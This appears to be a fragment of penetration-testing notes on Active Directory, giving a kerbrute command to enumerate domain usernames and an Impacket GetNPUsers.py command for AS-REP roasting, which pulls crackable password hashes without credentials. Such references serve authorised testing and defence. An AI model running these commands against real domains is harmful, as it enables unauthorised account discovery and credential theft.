...
```shell
python kerbrute.py userenum --dc <IP> -d <domain name> <userlist.txt> -t <threads>
```
...
With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetNPUsers.py:
```
# check ASREPRoast for the hash of user (no credentials required)
python GetNPUsers.py --dc-ip <IP> domain.local/<user>
```
